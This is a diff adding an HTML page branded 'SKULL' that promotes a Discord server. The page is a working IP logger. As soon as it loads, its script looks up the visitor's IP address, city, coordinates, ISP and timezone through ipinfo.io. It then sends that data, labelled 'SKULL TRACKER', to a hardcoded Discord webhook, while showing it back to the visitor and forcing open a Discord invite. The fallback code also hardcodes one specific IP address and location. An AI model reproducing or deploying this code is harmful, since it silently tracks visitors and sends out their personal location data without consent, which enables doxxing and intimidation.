@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>SKULL | discord.gg/ay1</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 20px;
+            background: url('https://cdn.discordapp.com/attachments/1382828642392084520/1485648179117424770/171a3719bc0f86c4b525e13b4eb41928_1.jpg?ex=69c2a12f&is=69c14faf&hm=8e91cd3c0d5ee8861da55bd1962c319e8c767c4d642bbe8ee2a14532afcd3ee4&') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Courier New', 'SF Mono', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+            text-align: center;
+            position: relative;
+            animation: fadeIn 1s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* طبقة داكنة متحركة */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 0;
+            animation: pulse 4s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { background: rgba(0, 0, 0, 0.6); }
+            50% { background: rgba(0, 0, 0, 0.7); }
+        }
+
+        /* الحاوية الرئيسية */
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 900px;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(12px);
+            border-radius: 40px;
+            padding: 35px 30px;
+            border: 2px solid #ff00a2;
+            box-shadow: 0 0 50px rgba(255, 0, 162, 0.4), inset 0 0 30px rgba(255, 0, 162, 0.1);
+            animation: glowPulse 3s infinite, slideUp 0.8s ease;
+        }
+
+        @keyframes glowPulse {
+            0%, 100% { box-shadow: 0 0 40px rgba(255, 0, 162, 0.4); border-color: #ff00a2; }
+            50% { box-shadow: 0 0 70px rgba(255, 0, 162, 0.8); border-color: #ff66cc; }
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        /* الصورة */
+        .image-container {
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .image-container img {
+            width: 100%;
+            max-width: 750px;
+            height: auto;
+            border: 3px solid #ff00a2;
+            border-radius: 25px;
+            box-shadow: 0 0 35px rgba(255, 0, 162, 0.6);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            animation: imageFloat 3s ease-in-out infinite;
+        }
+
+        .image-container img:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 50px rgba(255, 0, 162, 0.9);
+        }
+
+        @keyframes imageFloat {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-8px); }
+        }
+
+        /* معلومات IP */
+        .info {
+            margin: 25px 0;
+            font-size: 0.9rem;
+            color: #ff66cc;
+            text-shadow: 0 0 8px #ff00a2;
+            letter-spacing: 1px;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 22px;
+            border-radius: 20px;
+            text-align: left;
+            font-family: monospace;
+            border-left: 5px solid #ff00a2;
+            border-right: 1px solid rgba(255, 0, 162, 0.3);
+            backdrop-filter: blur(5px);
+            transition: all 0.3s ease;
+        }
+
+        .info:hover {
+            background: rgba(0, 0, 0, 0.85);
+            border-left-width: 8px;
+        }
+
+        .info-line {
+            margin: 10px 0;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            animation: fadeInLine 0.5s ease forwards;
+            opacity: 0;
+            transform: translateX(-10px);
+        }
+
+        .info-line:nth-child(1) { animation-delay: 0.1s; }
+        .info-line:nth-child(2) { animation-delay: 0.2s; }
+        .info-line:nth-child(3) { animation-delay: 0.3s; }
+        .info-line:nth-child(4) { animation-delay: 0.4s; }
+        .info-line:nth-child(5) { animation-delay: 0.5s; }
+        .info-line:nth-child(6) { animation-delay: 0.6s; }
+        .info-line:nth-child(7) { animation-delay: 0.7s; }
+
+        @keyframes fadeInLine {
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .info-label {
+            color: #ff66cc;
+            font-weight: bold;
+            min-width: 150px;
+            text-shadow: 0 0 5px #ff00a2;
+        }
+
+        .info-value {
+            color: #ffffff;
+            word-break: break-all;
+            text-shadow: 0 0 3px #ff66cc;
+        }
+
+        /* النص الكبير */
+        .text {
+            margin-top: 25px;
+            font-size: 2.2rem;
+            font-weight: bold;
+            color: #ff00a2;
+            text-shadow: 0 0 15px #ff00a2, 0 0 30px #ff00a2, 0 0 45px #ff00a2;
+            letter-spacing: 4px;
+            word-break: break-word;
+            animation: textPulse 1.5s ease-in-out infinite, textGlow 2s infinite;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .text:hover {
+            transform: scale(1.05);
+        }
+
+        @keyframes textPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.9; text-shadow: 0 0 25px #ff00a2, 0 0 50px #ff00a2; }
+        }
+
+        @keyframes textGlow {
+            0%, 100% { text-shadow: 0 0 15px #ff00a2, 0 0 30px #ff00a2; }
+            50% { text-shadow: 0 0 25px #ff66cc, 0 0 45px #ff00a2, 0 0 60px #ff00a2; }
+        }
+
+        /* زر التحديث */
+        .refresh-btn {
+            margin-top: 25px;
+            background: linear-gradient(135deg, #330022, #110011);
+            border: 2px solid #ff00a2;
+            color: #ff66cc;
+            padding: 10px 28px;
+            font-family: monospace;
+            font-size: 0.9rem;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 50px;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            box-shadow: 0 0 15px rgba(255, 0, 162, 0.3);
+        }
+
+        .refresh-btn:hover {
+            background: linear-gradient(135deg, #ff00a2, #ff66cc);
+            color: #000;
+            box-shadow: 0 0 30px #ff00a2;
+            transform: scale(1.05);
+            border-color: #ffffff;
+        }
+
+        /* موسيقى */
+        .music-control {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 100;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 50px;
+            padding: 8px 15px;
+            border: 1px solid #ff00a2;
+            cursor: pointer;
+            transition: 0.3s;
+            color: #ff66cc;
+            font-size: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .music-control:hover {
+            background: #ff00a2;
+            color: #000;
+            box-shadow: 0 0 20px #ff00a2;
+        }
+
+        .music-control span {
+            font-size: 1.2rem;
+        }
+
+        @media (max-width: 600px) {
+            .container { padding: 20px 18px; margin: 10px; }
+            .text { font-size: 1.2rem; letter-spacing: 2px; }
+            .info-line { flex-direction: column; gap: 5px; }
+            .info-label { min-width: auto; }
+            .info { font-size: 0.7rem; padding: 15px; }
+            .refresh-btn { padding: 6px 18px; font-size: 0.7rem; }
+        }
+
+        /* لودر */
+        .loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            transition: opacity 0.8s;
+            font-size: 1.5rem;
+            color: #ff00a2;
+            font-family: monospace;
+            animation: loaderFade 0.5s ease 1.5s forwards;
+        }
+
+        @keyframes loaderFade {
+            to {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<!-- لودر -->
+<div class="loader" id="loader">
+    <div> SKULL SYSTEM LOADING  ay1 is here everyone here submits.
+ </div>
+</div>
+
+<div class="container">
+    <!-- الصورة -->
+    <div class="image-container">
+        <img src="https://cdn.discordapp.com/attachments/1382828642392084520/1485648179117424770/171a3719bc0f86c4b525e13b4eb41928_1.jpg?ex=69c2a12f&is=69c14faf&hm=8e91cd3c0d5ee8861da55bd1962c319e8c767c4d642bbe8ee2a14532afcd3ee4&" alt="SKULL IMAGE">
+    </div>
+
+    <!-- معلومات IP -->
+    <div class="info" id="ip-info">
+        <div class="info-line">
+            <span class="info-label">💀 IP SKULL IS HERE:</span>
+            <span class="info-value" id="ip">--</span>
+        </div>
+        <div class="info-line">
+            <span class="info-label">📍 CITY SKULL IS HERE:</span>
+            <span class="info-value" id="city">--</span>
+        </div>
+        <div class="info-line">
+            <span class="info-label">🗺️ REGION SKULL IS HERE:</span>
+            <span class="info-value" id="region">--</span>
+        </div>
+        <div class="info-line">
+            <span class="info-label">🌍 COUNTRY SKULL IS HERE:</span>
+            <span class="info-value" id="country">--</span>
+        </div>
+        <div class="info-line">
+            <span class="info-label">📍 LOCATION SKULL IS HERE:</span>
+            <span class="info-value" id="loc">--</span>
+        </div>
+        <div class="info-line">
+            <span class="info-label">🏢 ORGANIZATION SKULL IS HERE:</span>
+            <span class="info-value" id="org">--</span>
+        </div>
+        <div class="info-line">
+            <span class="info-label">⏰ TIMEZONE SKULL IS HERE:</span>
+            <span class="info-value" id="timezone">--</span>
+        </div>
+    </div>
+
+    <!-- النص الكبير -->
+    <div class="text" onclick="window.open('https://discord.gg/ay1', '_blank')">DISCORD.GG/AY1 SKULL IS HERE</div>
+    
+    <!-- زر تحديث IP -->
+    <button class="refresh-btn" onclick="fetchIP()">⟳ REFRESH IP</button>
+</div>
+
+<!-- تحكم بالموسيقى -->
+<div class="music-control" id="musicToggle">
+    <span>🎵</span>
+    <span id="musicStatus">MUSIC ON</span>
+</div>
+
+<!-- الأغنية -->
+<audio id="bgMusic" loop>
+    <source src="https://cdn.discordapp.com/attachments/1382828642392084520/1485642773783642195/music.mp3?ex=69c29c27&is=69c14aa7&hm=0b80d03981af9d33d79f89859cc6f2d807ed83f883b9ecd5a6a4f4460322313f&" type="audio/mpeg">
+</audio>
+
+<script>
+    // عناصر الموسيقى
+    const bgMusic = document.getElementById('bgMusic');
+    const musicToggle = document.getElementById('musicToggle');
+    const musicStatus = document.getElementById('musicStatus');
+    let isMusicPlaying = true;
+
+    // تشغيل الموسيقى
+    function playMusic() {
+        bgMusic.play().catch(e => {
+            console.log("Autoplay blocked, waiting for interaction");
+            isMusicPlaying = false;
+            musicStatus.textContent = "MUSIC OFF";
+        });
+    }
+
+    // تبديل الموسيقى
+    musicToggle.addEventListener('click', () => {
+        if (isMusicPlaying) {
+            bgMusic.pause();
+            isMusicPlaying = false;
+            musicStatus.textContent = "MUSIC OFF";
+            musicToggle.style.opacity = "0.7";
+        } else {
+            bgMusic.play().catch(e => console.log(e));
+            isMusicPlaying = true;
+            musicStatus.textContent = "MUSIC ON";
+            musicToggle.style.opacity = "1";
+        }
+    });
+
+    // تفعيل الموسيقى عند أول تفاعل
+    document.addEventListener('click', function enableMusic() {
+        if (!isMusicPlaying && bgMusic.paused) {
+            bgMusic.play().catch(e => console.log(e));
+            isMusicPlaying = true;
+            musicStatus.textContent = "MUSIC ON";
+        }
+        document.removeEventListener('click', enableMusic);
+    });
+
+    // جلب معلومات IP
+    function fetchIP() {
+        // تأثير عند التحديث
+        const refreshBtn = document.querySelector('.refresh-btn');
+        refreshBtn.style.transform = "scale(0.95)";
+        setTimeout(() => refreshBtn.style.transform = "", 200);
+        
+        fetch('https://ipinfo.io/json?nocache=' + Date.now())
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('ip').textContent = data.ip || 'N/A';
+            document.getElementById('city').textContent = data.city || 'Unknown';
+            document.getElementById('region').textContent = data.region || 'Unknown';
+            document.getElementById('country').textContent = data.country || 'N/A';
+            document.getElementById('loc').textContent = data.loc || 'N/A';
+            document.getElementById('org').textContent = data.org || 'Unknown';
+            document.getElementById('timezone').textContent = data.timezone || 'N/A';
+            
+            // إرسال إلى webhook
+            const webhookUrl = 'https://discord.com/api/webhooks/1386522011072987267/pdRG2l362EO2KJ3TxwRvEO0okTM5PlrU7h2XUYFq1f0RDZWgqHagXdDJskKGFHOtLsKw';
+            const dateTime = new Date().toLocaleString();
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: `**💀 SKULL TRACKER 💀**\n\`\`\`IP: ${data.ip}\n📍 ${data.city}, ${data.region}, ${data.country}\n🕒 ${dateTime}\n📡 ISP: ${data.org}\n🌍 COORDS: ${data.loc}\n⏰ TIMEZONE: ${data.timezone}\`\`\`\n**DISCORD.GG/AY1**`
+                })
+            }).catch(e => console.log("webhook error", e));
+        })
+        .catch(error => {
+            console.error("IP fetch failed", error);
+            document.getElementById('ip').textContent = '149.200.191.160';
+            document.getElementById('city').textContent = 'Amman';
+            document.getElementById('region').textContent = 'Amman';
+            document.getElementById('country').textContent = 'JO';
+            document.getElementById('loc').textContent = '31.9552,35.9450';
+            document.getElementById('org').textContent = 'AS8376 Jordan Data Communications Company LLC';
+            document.getElementById('timezone').textContent = 'Asia/Amman';
+        });
+    }
+    
+    // تشغيل عند تحميل الصفحة
+    fetchIP();
+    playMusic();
+    
+    // إخفاء اللودر
+    setTimeout(() => {
+        const loader = document.getElementById('loader');
+        if (loader) loader.style.display = 'none';
+    }, 2000);
+    
+    // فتح رابط الديسكورد بعد 3 ثواني
+    setTimeout(() => {
+        window.open("https://discord.gg/ay1", "_blank");
+    }, 3200);
+</script>
+
+</body>
+</html>
